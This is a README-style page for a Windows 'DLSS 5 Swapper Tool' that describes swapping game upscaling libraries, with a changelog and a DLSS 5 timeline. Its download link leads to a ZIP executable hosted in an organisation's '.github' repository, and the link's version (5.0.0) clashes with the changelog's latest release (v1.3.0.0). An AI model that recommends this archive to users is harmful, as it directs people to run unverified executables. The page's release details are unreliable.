# DLSS 5 Swapper Tool

<p align="center">
  <img src="https://github.com/DLSS-5-Swapper-Tool/.github/blob/main/assets/image/1.gif?raw=true" width="700" alt="DLSS 5 Swapper Tool Interface">
</p>

DLSS Swapper is an open-source Windows utility for managing and replacing supported upscaling libraries used by PC games. It provides a centralized interface for discovering installed libraries, downloading compatible versions, creating backups, and switching between versions without manually searching through game directories.

The project supports multiple modern upscaling technologies, including NVIDIA DLSS, AMD FSR 3.1, and Intel XeSS. It is designed for users who want to test different library versions, troubleshoot compatibility issues, or compare image quality and performance across releases.

This edition of the project documentation has been updated for the DLSS 5 generation and uses a more conservative, technical presentation style.

---

## Features

### Library Management

View detected upscaling libraries and their versions from a single interface. Multiple versions can be stored locally and selected when required.

### NVIDIA DLSS

Manage supported NVIDIA DLSS libraries and switch between compatible releases without manually replacing files.

### DLSS 5

DLSS 5 introduces NVIDIA's 3D-Guided Neural Rendering technology. Unlike a conventional library revision that can simply be treated as another version of a single DLL, DLSS 5 depends on the way a game integrates the technology.

DLSS Swapper can therefore manage supported files and components where the game's implementation permits it, but it does not add DLSS 5 support to games that were not designed to use it.

### AMD FSR 3.1

Manage supported AMD FSR 3.1 libraries in games where the relevant components can be replaced independently.

### Intel XeSS

Manage compatible Intel XeSS libraries and maintain multiple versions for testing and rollback.

### Automatic Detection

Scan supported game installations and identify available upscaling libraries automatically, reducing the need to locate individual files manually.

### Backup and Restore

Create backups before modifying game files. Original files can be restored when a replacement causes compatibility problems or when the user wants to return to the previous configuration.

### Version Switching

Select a stored library version and replace the corresponding supported game component with minimal manual intervention.

### Local Import

Import supported libraries from local files or compatible sources. This is useful when a required version is already available on the system.

### Download Management

Download supported library packages directly through the application where a configured source is available.

Proxy configuration can be used for environments where direct connections are restricted.

### Update Management

Check installed components for available updates and keep locally stored versions organized.

### Game Detection

Detect supported games installed through common PC game distribution platforms and account for non-standard installation paths where possible.

---

## Supported Technologies

| Technology | Primary purpose | Library management |
|---|---|---|
| NVIDIA DLSS | AI-based image reconstruction and upscaling | Supported |
| NVIDIA DLSS 5 | 3D-Guided Neural Rendering | Dependent on game integration |
| DLSS Frame Generation | AI-generated intermediate frames | Supported where applicable |
| DLSS Ray Reconstruction | Neural reconstruction for ray-traced content | Dependent on game integration |
| AMD FSR 3.1 | Upscaling and related rendering features | Supported where applicable |
| Intel XeSS | AI-assisted image reconstruction | Supported where applicable |

---

## Download

Download the current Windows build as a ZIP archive.

### [Download DLSS Swapper — ZIP](https://github.com/DLSS-5-Swapper-Tool/.github/releases/download/5.0.0/DLSS5.SwapperTool.v.5.0.0.zip)

**Archive format:** `.zip`  
**Platform:** Windows

### Installation

1. Download the ZIP archive.
2. Extract it to a directory of your choice.
3. Launch the application executable.
4. Allow the application to scan supported game installations.
5. Select a game to inspect its detected libraries.

DLSS Swapper does not require a traditional installer when distributed as a portable ZIP build.

---

## Getting Started

1. Launch DLSS Swapper.
2. Allow the application to detect installed games.
3. Select the required game.
4. Review the detected DLSS, FSR, or XeSS components.
5. Create a backup of the original files.
6. Select the required library version.
7. Apply the replacement.
8. Launch the game and test the result.
9. Restore the backup if the replacement causes instability or incompatibility.

It is recommended to close the game before replacing any library files.

---

## How It Works

DLSS Swapper is primarily a library management utility. It does not modify a game's executable code to add support for an upscaling technology that the game does not already implement.

A typical operation follows this sequence:

```text
Game installation
       |
       v
Library detection
       |
       v
Version identification
       |
       v
Backup of original files
       |
       v
Library selection
       |
       v
File replacement
       |
       v
Game testing
       |
       +---- Restore backup if required
```

The exact result depends on the game's implementation, file structure, DRM, anti-cheat system, and the way its developer integrated the relevant rendering technology.

---

## DLSS 5 Compatibility

DLSS 5 should not be treated as a simple replacement for an earlier `nvngx_dlss.dll` version.

NVIDIA describes DLSS 5 as a 3D-Guided Neural Rendering system that uses information supplied by the game engine, including rendered scene information and motion data, as part of its neural rendering process.

As a result, replacing a conventional DLSS library does not automatically enable DLSS 5 in an unsupported game.

DLSS Swapper can manage compatible files where the game's existing implementation allows replacement, but actual DLSS 5 functionality remains dependent on the game's integration and supported hardware/software configuration.

---

## Backups and Recovery

A backup should be created before replacing a game library.

Backups make it possible to:

- restore the original library;
- undo an unsuccessful experiment;
- recover from compatibility problems;
- compare different library versions;
- avoid downloading the original files again.

For games protected by anti-cheat or DRM systems, review the game's rules before modifying installed files.

---

## Version Testing

Different library releases can produce different results depending on the game and rendering configuration.

For meaningful comparisons, keep the following conditions consistent:

- display resolution;
- upscaling mode;
- graphics preset;
- ray tracing settings;
- NVIDIA or AMD driver version;
- game version;
- test scene;
- frame-rate limit, if applicable.

Image quality, frame-time behavior, stability, and average performance should be evaluated under the same conditions.

---

# Changelog

> This section reflects the DLSS 5-era documentation and release line used for this project description. It should not be interpreted as the official NVIDIA DLSS release history.

## v1.3.0.0 — September 28, 2026

### DLSS 5 Edition

- Reworked the library management interface.
- Updated documentation for NVIDIA DLSS 5 and 3D-Guided Neural Rendering.
- Improved identification of individual DLSS components.
- Added clearer separation between Super Resolution, Frame Generation, and Ray Reconstruction components.
- Improved game library detection.
- Strengthened backup validation before file replacement.
- Improved restore handling after unsuccessful replacements.
- Updated the download interface.
- Improved version and source metadata displayed for downloaded libraries.
- Added additional compatibility warnings for DLSS 5-related components.
- Expanded documentation for DRM and anti-cheat considerations.

## v1.2.9.0 — September 22, 2026

- Updated the compatible component database.
- Improved game directory scanning.
- Improved local library import.
- Fixed several backup restoration edge cases.
- Improved download error reporting.
- Updated translations.
- Updated DLSS 5 compatibility documentation.

## v1.2.8.0 — September 15, 2026

- Improved handling of multiple installed versions of the same library.
- Added additional library architecture information.
- Optimized game detection for Steam and Epic Games Store installations.
- Improved detection of non-standard installation paths.
- Fixed issues with cancelled downloads.
- Improved operation logging.

## v1.2.7.0 — September 8, 2026

- Updated the DLSS version management interface.
- Added additional compatibility information.
- Improved automatic backup handling.
- Improved notifications displayed before launching or restarting a game.
- Fixed invalid or incomplete archive handling.
- Updated documentation following the DLSS 5 launch.

## v1.2.6.0 — September 1, 2026

### DLSS 5 Launch Update

- Added DLSS 5 documentation and compatibility information.
- Updated the component metadata model for newer NVIDIA rendering technologies.
- Improved display of DLSS-related components.
- Added warnings for games without native DLSS 5 integration.
- Updated the compatibility reference.
- Updated the download panel.
- Added support for additional library metadata.

---

## DLSS 5 Timeline

**March 16, 2026** — NVIDIA announced DLSS 5 and introduced 3D-Guided Neural Rendering as the basis of the new technology.

**September 1, 2026** — NVIDIA announced DLSS 5 availability. The technology debuted in NBA 2K27 for GeForce RTX 50 Series GPUs.

**September 22, 2026** — NVIDIA published additional developer information covering DLSS 5, 3D-Guided Neural Rendering, integration requirements, and developer controls.

---

## Compatibility Notes

DLSS Swapper manages existing game components. It does not provide universal compatibility between every version of DLSS, FSR, or XeSS and every game.

Compatibility can depend on:

- game version;
- rendering engine;
- SDK version;
- library dependencies;
- GPU architecture;
- driver version;
- DRM;
- anti-cheat software;
- developer-specific integration;
- whether the relevant component can be replaced independently.

A library that works correctly in one game may not work correctly in another game using the same general technology.

---

## Safety and Usage Recommendations

Before replacing a library:

- close the game;
- create a backup;
- verify the selected library version;
- avoid untrusted DLL downloads;
- keep the original game files available;
- check for game updates before testing again;
- review anti-cheat and DRM requirements for online games.

If a game stops launching after a replacement, restore the original backup before performing additional modifications.

---

## Project Structure

A recommended distribution structure is:

```text
DLSS-Swapper/
├── DLSS-Swapper.exe
├── Libraries/
├── Backups/
├── Downloads/
├── Config/
└── README.md
```

The exact directory structure may differ between releases.

---

## Official References

- [NVIDIA — DLSS 5 and 3D-Guided Neural Rendering](https://developer.nvidia.com/blog/whats-new-for-game-developers-dlss-5-with-3d-guided-neural-rendering-nvidia-ace-updates-and-new-rtx-kit-capabilities/)
- [NVIDIA Research — DLSS 5](https://research.nvidia.com/labs/adlr/DLSS5/)
- [NVIDIA DLSS Developer Resources](https://developer.nvidia.com/dlss)

---

## Summary

DLSS Swapper is a library management utility for users who need a convenient way to inspect, store, replace, and restore supported upscaling components used by PC games.

The project covers NVIDIA DLSS, AMD FSR 3.1, and Intel XeSS, while the DLSS 5 Edition updates the documentation and component model for NVIDIA's latest generation of neural rendering technology.

DLSS Swapper does not bypass game compatibility requirements. The functionality available for a particular game depends on the technology already integrated by its developer and on the compatibility of the selected library with that implementation.
